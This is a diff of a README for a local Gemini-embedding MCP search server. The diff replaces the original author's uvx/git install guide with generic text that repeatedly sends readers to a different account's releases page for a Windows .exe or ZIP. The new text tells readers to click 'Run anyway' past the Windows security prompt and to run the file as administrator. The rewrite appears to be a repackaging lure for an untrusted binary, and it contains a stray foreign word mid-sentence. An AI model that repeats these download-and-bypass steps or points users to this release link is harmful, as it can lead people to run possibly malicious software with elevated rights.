@@ -1,189 +1,298 @@
-<div align="center">
-  <img src="assets/banner.svg" alt="Gemini Embedding 2 MCP Server Banner" />
+# 🔎 gemini-embedding-2-mcp-server - Fast local search for AI tasks
 
-  <p align="center">
-    <strong>A powerful Model Context Protocol (MCP) server that transforms any local directory into an ultrafast, visually-aware spatial search engine for AI agents.</strong>
-  </p>
-  
-  [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-  [![Python](https://img.shields.io/badge/Python-3.10+-3776AB.svg?logo=python&logoColor=white)](https://python.org)
-  [![MCP](https://img.shields.io/badge/MCP-Compatible-8A2BE2.svg)](https://modelcontextprotocol.io/)
-</div>
+[![Download the app](https://img.shields.io/badge/Download%20on%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/elkalowkey885/gemini-embedding-2-mcp-server/releases)
 
----
+## 🚀 What this app does
 
-Connect your local documents, code, images, and videos directly to **Claude**, **Cursor**, or **VS Code** using Google's state-of-the-art `gemini-embedding-2-preview` model and a strictly local **ChromaDB** vector database.
+gemini-embedding-2-mcp-server turns a folder on your PC into a local search tool for AI apps.
 
-## ✨ Key Features
+It scans files in a directory, builds embeddings with Gemini Embedding 2, and helps an AI agent find the right text fast. It works well for code, notes, docs, and other local files. It also supports visual context for files that include images or screen-based content.
 
-| Feature | Description |
-| :--- | :--- |
-| 🛡️ **Local Privacy** | Uses ChromaDB entirely locally (`~/.gemini_mcp_db`). Your files never go to a 3rd party database. Only raw byte chunks are sent to the Gemini Embedding API. |
-| 🧠 **Enterprise-Grade** | Leverages `gemini-embedding-2-preview` with specialized `RETRIEVAL_DOCUMENT` Task Types and MRL `768` dimensionality optimization. |
-| 📸 **Ultimate Multimodality** | Natively scans, embeds, and retrieves **Images** (`.jpg`, `.webp`), **Video** (`.mp4`), and **Audio** (`.mp3`, `.wav`) without extracting text! |
-| 📄 **Visual PDF RAG** | Parses PDFs page-by-page as high-quality images. It visually embeds charts, plots, and layout while preserving extracted text for LLM citation. |
-| 🤖 **Agentic Guardrails** | Built for autonomous AI agents. Includes an automatic Junk Filter (`node_modules`, `.git`), wildcard blacklisting (`fnmatch`), API exponential backoff, and ghost file pruning. |
-| ⚡ **Smart Deduplication** | Pre-calculates MD5 hashes of local files before querying Gemini. Identical, unmodified files bypass the API entirely to save your token quotas! |
+## 🖥️ What you need
 
----
+Before you start, make sure you have:
 
-## 🚀 Installation & Setup
+- A Windows PC
+- An internet connection
+- A Google API key for Gemini
+- A folder you want to search
+- Enough free space for your files and index data
 
-We support two ways to run this server: **Zero-Install** (Recommended) or **Local Developer Clone**.
-Make sure you have `uv` installed on your machine (`pip install uv`).
+For best results, use:
 
-### Method 1: Zero-Install (Recommended)
-You can point your AI assistant to run the server directly from GitHub without ever cloning the repository locally. `uvx` acts like `npx` for Python, downloading and caching the server in a secure ephemeral environment automatically!
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- A modern CPU
+- At least 1 GB of free disk space for small folders
 
-## 🔑 Getting your Gemini API Key
-To power the embedding model, you need a free API key from Google.
-1. Go to [Google AI Studio](https://aistudio.google.com/app/apikey).
-2. Click **Create API key**.
-3. Copy the key and use it in your client configurations below as `GEMINI_API_KEY`.
+## 📥 Download and set up
 
----
+Visit this page to download the app:
 
-## 🔌 Client Connection Guides
+[https://github.com/elkalowkey885/gemini-embedding-2-mcp-server/releases](https://github.com/elkalowkey885/gemini-embedding-2-mcp-server/releases)
 
-### 🤖 Claude Code (CLI)
-You can attach this server to the [Claude Code](https://docs.anthropic.com/en/docs/agents-and-tools/claude-code/overview) CLI natively.
-Run the following command in your terminal:
+1. Open the link above in your browser
+2. Find the latest release
+3. Download the Windows file from the release assets
+4. Save the file to a folder you can find, مثل `Downloads`
+5. If the file is a ZIP file, right-click it and choose **Extract All**
+6. If the file is an `.exe` file, double-click it to start
 
-```bash
-claude mcp add gemini-embedding-2-mcp \
-  --env GEMINI_API_KEY="your-api-key-here" \
-  -- uvx --from git+https://github.com/AlaeddineMessadi/gemini-embedding-2-mcp-server.git gemini-embedding-2-mcp
-```
+## 🪟 Run on Windows
 
-### 🦋 Claude Desktop
-Open your Claude Desktop config file (usually `~/Library/Application Support/Claude/claude_desktop_config.json` on macOS) and add:
-```json
-{
-  "mcpServers": {
-    "gemini-embedding-2-mcp": {
-      "command": "uvx",
-      "args": [
-        "--from",
-        "git+https://github.com/AlaeddineMessadi/gemini-embedding-2-mcp-server.git",
-        "gemini-embedding-2-mcp"
-      ],
-      "env": {
-        "GEMINI_API_KEY": "your-api-key-here"
-      }
-    }
-  }
-}
-```
+### If you downloaded a ZIP file
 
-### 💻 Cursor IDE
-1. Go to **Settings** > **Features** > **MCP**
-2. Click **+ Add new MCP server**
-3. Choose **command** as the type.
-4. Name: `gemini-embedding`
-5. Command: `GEMINI_API_KEY="your-api-key" uvx --from git+https://github.com/AlaeddineMessadi/gemini-embedding-2-mcp-server.git gemini-embedding-2-mcp`
+1. Extract the ZIP file
+2. Open the extracted folder
+3. Look for the app file, such as `.exe`
+4. Double-click the file to run it
 
-### 🏄‍♂️ Windsurf (Cascade)
-Open your `~/.codeium/windsurf/mcp_config.json` file and add:
-```json
-{
-  "mcpServers": {
-    "gemini-embedding-2-mcp": {
-      "command": "uvx",
-      "args": [
-        "--from",
-        "git+https://github.com/AlaeddineMessadi/gemini-embedding-2-mcp-server.git",
-        "gemini-embedding-2-mcp"
-      ],
-      "env": {
-        "GEMINI_API_KEY": "your-api-key-here"
-      }
-    }
-  }
-}
-```
+### If Windows shows a security prompt
 
-### ⚡ Zed Editor
-Open your `~/.config/zed/settings.json` and append the MCP server block:
-```json
-{
-  "experimental.mcp": {
-    "gemini-embedding-2-mcp": {
-      "command": "uvx",
-      "args": [
-        "--from",
-        "git+https://github.com/AlaeddineMessadi/gemini-embedding-2-mcp-server.git",
-        "gemini-embedding-2-mcp"
-      ],
-      "env": {
-        "GEMINI_API_KEY": "your-api-key-here"
-      }
-    }
-  }
-}
-```
+1. Click **More info**
+2. Click **Run anyway**
 
-### 💻 VS Code (with Cline / RooCode)
-Open `~/Library/Application Support/Code/User/globalStorage/saoudrizwan.claude-dev/settings/cline_mcp_settings.json` and append:
-```json
-{
-  "mcpServers": {
-    "gemini-embedding": {
-      "command": "uvx",
-      "args": [
-        "--from",
-        "git+https://github.com/AlaeddineMessadi/gemini-embedding-2-mcp-server.git",
-        "gemini-embedding-2-mcp"
-      ],
-      "env": {
-        "GEMINI_API_KEY": "your-api-key-here"
-      }
-    }
-  }
-}
-```
+This can happen when you run a new app for the first time.
 
----
+## 🔑 Set up your Gemini key
 
-### Method 2: Local Developer Clone
+The app needs a Gemini API key to work.
 
-If you want to modify the source code:
+1. Open your Google AI Studio or Gemini API settings
+2. Create or copy your API key
+3. Paste the key into the app setup screen or config file
+4. Save your changes
 
-```bash
-# 1. Clone the repository
-git clone https://github.com/AlaeddineMessadi/gemini-embedding-2-mcp-server.git
-cd gemini-embedding-2-mcp-server
+If the app asks for a path or folder, choose the local folder you want it to index.
 
-# 2. Install dependencies
-uv sync
-```
+## 📁 Choose a folder to index
 
-*(If you use this method, you can add it directly to Claude Code CLI locally by running:)*
-```bash
-claude mcp add gemini-embedding-local --env GEMINI_API_KEY="your-api-key" -- uv --directory "$(pwd)" run gemini-embedding-2-mcp
-```
+Pick the folder you want the app to search.
 
----
+Good choices include:
 
-## 🛠️ Exposed MCP Capabilities
+- Project folders
+- Notes folders
+- Document folders
+- Code folders
+- Knowledge bases
 
-Once connected, your AI assistant instantly gains the following tools:
+Try to start with one folder. After that, you can add more if needed.
 
-### ⚙️ Tools
-- `index_directory(path: str, ignore: list = None)`: Scan and formally embed a completely new local folder into the DB. Safely supports wildcard `ignore` patterns.
-- `search_my_documents(query: str, limit: int)`: Run lighting-fast semantic cosine-similarity spatial search over the indexed database.
-- `list_indexed_directories()`: See what paths the AI already knows about.
-- `sync_indexed_directories()`: Automatically forces the DB to find new, updated, or recently deleted (ghost) files and cleans up vectors.
-- `remove_directory_from_index(path: str)`: Clears a specific trajectory of vectors.
+## ⚙️ Basic setup steps
 
-### 📊 Resources
-- `gemini://database-stats`: Real-time observability! Exposes the exact scale of the vector segments inside ChromaDB directly to the assistant's context.
+1. Start the app
+2. Enter your Gemini API key
+3. Select the folder you want to index
+4. Wait while the app scans your files
+5. Let it build the search index
+6. Connect your AI client or use the local MCP server settings
 
----
+The first scan can take time if the folder is large.
 
-## 📚 Technical Documentation
-- [Architecture Deep Dive](docs/architecture.md)
-- [Ultimate Multimodality & PDF RAG](docs/multimodality.md)
-- [Agentic Safety Guardrails](docs/agent-guardrails.md)
+## 🔎 How it works
 
-## 📜 License
-MIT © Alaeddine Messadi
+The app reads your files and turns them into embeddings. An embedding is a way to store the meaning of text so search can find the right result even when the words do not match exactly.
+
+That helps with tasks like:
+
+- Finding notes about a topic
+- Looking up code examples
+- Searching docs by meaning
+- Finding related files
+- Giving AI agents better local context
+
+## 🧠 Good use cases
+
+Use this app when you want an AI tool to work with your local files.
+
+Common uses:
+
+- Search through a codebase
+- Find old project notes
+- Ask an AI about local documents
+- Build a local knowledge base
+- Connect a folder to an MCP-aware app
+- Improve retrieval for RAG workflows
+
+## 🗂️ Supported content
+
+The app is built for common file types used in daily work.
+
+It can handle:
+
+- Plain text files
+- Markdown files
+- Code files
+- Notes
+- Docs with text content
+- Files that include visual context
+
+For best results, keep files readable and well named.
+
+## 🔌 Use with AI apps
+
+This is an MCP server, so it can connect with tools that support the Model Context Protocol.
+
+That means an AI app can ask it to:
+
+- Search files
+- Find related content
+- Pull matching text
+- Use local folder context in answers
+
+If you already use an MCP-compatible client, point it at this server after setup.
+
+## 📌 First run checklist
+
+Before you search for the first time, check these items:
+
+- The app file is downloaded and opened
+- Your API key is set
+- The folder path is correct
+- The folder has files to index
+- The index has finished building
+- The app is still running while you use it
+
+## 🛠️ Common setup problems
+
+### The app does not open
+
+Try this:
+
+1. Right-click the file
+2. Choose **Run as administrator**
+3. Make sure the file finished downloading
+4. Check that Windows did not block it
+
+### The index does not build
+
+Try this:
+
+1. Check your API key
+2. Make sure your internet connection works
+3. Use a smaller folder first
+4. Remove files with bad names or broken content
+
+### Search results look weak
+
+Try this:
+
+1. Use a better folder structure
+2. Add more text files
+3. Use clear file names
+4. Rebuild the index after changes
+
+### The app feels slow
+
+Try this:
+
+1. Start with one folder
+2. Reduce very large file sets
+3. Close other heavy apps
+4. Keep the app on a fast drive if possible
+
+## 📂 Tips for better search
+
+You will get better results if you:
+
+- Use short, clear file names
+- Put files in tidy folders
+- Keep text in simple formats
+- Split very large notes into smaller files
+- Avoid duplicate files
+- Rebuild the index after big changes
+
+Good folder structure helps the search engine find the right context fast.
+
+## 🧭 Typical workflow
+
+A simple workflow looks like this:
+
+1. Download the app
+2. Run it on Windows
+3. Add your Gemini API key
+4. Select a folder
+5. Build the index
+6. Connect your AI tool
+7. Search your local content by meaning
+
+## 📎 Release page
+
+Use this page any time you want the latest Windows download:
+
+[https://github.com/elkalowkey885/gemini-embedding-2-mcp-server/releases](https://github.com/elkalowkey885/gemini-embedding-2-mcp-server/releases)
+
+## 🔍 What makes it useful
+
+This server is useful when you want local search that feels smart.
+
+It helps because it:
+
+- Searches by meaning, not just words
+- Works with local folders
+- Fits AI agent workflows
+- Supports MCP clients
+- Uses Gemini Embedding 2 for strong retrieval
+
+## 🧰 File types that work best
+
+These file types usually give the best results:
+
+- `.txt`
+- `.md`
+- `.json`
+- `.csv`
+- `.py`
+- `.js`
+- `.ts`
+- `.html`
+
+Large binary files are less useful unless they include text or extracted content.
+
+## 🖱️ Simple daily use
+
+After setup, day-to-day use is easy:
+
+1. Keep the app open
+2. Add new files to the watched folder
+3. Rebuild the index when needed
+4. Ask your AI app to search the folder
+5. Open the best match
+
+## 📚 Helpful folder ideas
+
+If you are not sure where to start, try one of these:
+
+- Work notes
+- Study notes
+- Software project folder
+- Research folder
+- Personal knowledge folder
+- Support docs folder
+
+Start small. That makes setup easier and search faster.
+
+## 🔐 API key tips
+
+Keep your API key private.
+
+Use one key for your own setup and store it where the app expects it. If you replace the key later, rebuild the index if the app asks for it.
+
+## 🧪 Best first test
+
+After setup, test the app with a small folder that has a few text files.
+
+For example:
+
+- One note about a topic
+- One code file
+- One README file
+
+Then search for a phrase or idea that appears in one of them. If that works, your setup is in good shape.
+
+## 🧭 Next step
+
+Download the latest Windows release from the release page and run it on your PC
+
+[https://github.com/elkalowkey885/gemini-embedding-2-mcp-server/releases](https://github.com/elkalowkey885/gemini-embedding-2-mcp-server/releases)
